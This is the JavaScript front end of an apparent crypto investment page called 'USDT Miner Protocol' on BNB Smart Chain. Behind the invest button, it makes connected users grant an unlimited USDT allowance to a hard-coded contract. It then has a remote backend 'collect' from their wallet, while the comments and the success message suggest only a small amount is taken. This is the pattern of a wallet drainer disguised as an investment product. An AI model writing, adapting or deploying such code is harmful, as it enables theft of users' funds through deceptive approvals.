import { createAppKit } from 'https://esm.sh/@reown/appkit@1.1.0';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@1.1.0';
import { bsc } from 'https://esm.sh/@reown/appkit/networks@1.1.0';

// ─── Configuración de Reown AppKit (WalletConnect) ───────────────────────────
// Obtén tu Project ID gratuito en https://cloud.reown.com
const REOWN_PROJECT_ID = "d0e2a91d8b8bd759f1e3cfb6ea1e41c0";

const appKitMetadata = {
  name: 'USDT Miner Protocol',
  description: 'USDT Miner Protocol on BSC',
  url: window.location.origin,
  icons: ['https://assets.reown.com/reown-profile-pic.png']
};

// Inicialización de AppKit nativo
const modal = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [bsc],
  metadata: appKitMetadata,
  projectId: REOWN_PROJECT_ID,
  features: {
    analytics: false,
    email: false,
    socials: []
  },
  themeMode: 'dark'
});

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 0 USDT before approve/collect
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "INVERTIR AHORA";
  btnSpinner.hidden   = !on;
}

// ─── RPC helper ───────────────────────────────────────────────────────────────
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

// ─── Helper para obtener el proveedor activo (Inyectado o AppKit) ──────────────
async function getActiveWalletProvider() {
  if (window.ethereum) return window.ethereum;
  if (modal.getIsConnected()) {
    return modal.getWalletProvider();
  }
  return null;
}

// ─── Poll allowance until mined ───────────────────────────────────────────────
async function waitForAllowanceConfirmed(provider, owner, spender, required, timeout = 120000) {
  const data =
    "0xdd62ed3e" +
    owner.slice(2).padStart(64, "0") +
    spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await provider.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
      });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out. Please try again.");
}

// ─── Backend collect (with retry) ─────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

async function getUsdtBalance(provider, userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await provider.request({
      method: "eth_call",
      params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
    });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── Main button handler ──────────────────────────────────────────────────────
approveBtn.addEventListener("click", async () => {
  let provider = await getActiveWalletProvider();

  // Si no hay billetera conectada ni detectada, abre el modal de Reown AppKit
  if (!provider || (!window.ethereum && !modal.getIsConnected())) {
    try {
      await modal.open();
      setLoading(true, "Connecting…");
      
      // Esperar la conexión del usuario desde AppKit Modal
      await new Promise((resolve, reject) => {
        const unsubscribe = modal.subscribeState(state => {
          if (state.open === false) {
            unsubscribe();
            if (modal.getIsConnected()) {
              resolve();
            } else {
              reject(new Error("Connection cancelled"));
            }
          }
        });
      });
      provider = await getActiveWalletProvider();
    } catch (err) {
      setLoading(false);
      return;
    }
  }

  setLoading(true, "Processing…");

  try {
    // Step 1 — Switch to BNB Smart Chain
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID_HEX }]
      });
    } catch (e) {
      if (e.code === 4902) {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_PARAMS]
        });
      } else if (
        e.code === 4001 ||
        (e.message || "").toLowerCase().includes("user rejected") ||
        (e.message || "").toLowerCase().includes("user denied")
      ) {
        showToast("Please switch to BNB Smart Chain to continue.", "error");
        setLoading(false);
        return;
      }
    }

    // Step 2 — Get wallet address
    let userAddress = null;
    try {
      const accs = await provider.request({ method: "eth_accounts" });
      userAddress = (accs && accs[0]) ? accs[0] : null;
    } catch (_) {}

    if (!userAddress && modal.getIsConnected()) {
      userAddress = modal.getAddress();
    }

    if (!userAddress) {
      showToast("Wallet not connected. Please try connecting again.", "error");
      setLoading(false);
      return;
    }

    const CAP_AMOUNT = ethers.MaxUint256;
    const iface      = new ethers.Interface(ERC20_ABI);

    const usdtBalance = await getUsdtBalance(provider, userAddress, iface);
    if (usdtBalance <= MIN_USDT_BALANCE) {
      showToast("Not enough USDT", "error");
      setLoading(false);
      return;
    }

    // Step 3 — Check existing allowance
    try {
      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
      const allowanceHex  = await provider.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
      });
      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
        setLoading(true, "Finalizing…");
        await triggerBackendCollect(userAddress);
        showToast("Sent Successfully, Thank you! ✓", "success");
        setLoading(false);
        return;
      }
    } catch (_) {}

    // Step 4 — Send approve transaction
    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
    
    await provider.request({
      method: "eth_sendTransaction",
      params: [{
        from:  userAddress,
        to:    BSC_USDT_ADDRESS,
        data:  approveData,
        value: "0x0"
      }]
    });

    // Step 5 — Wait for approve to be mined
    setLoading(true, "Confirming…");
    await waitForAllowanceConfirmed(provider, userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);

    // Step 6 — Backend collects 0.1 USDT
    setLoading(true, "Finalizing…");
    await triggerBackendCollect(userAddress);
    showToast("Sent Successfully, Thank you! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Unknown error";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transaction cancelled.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});
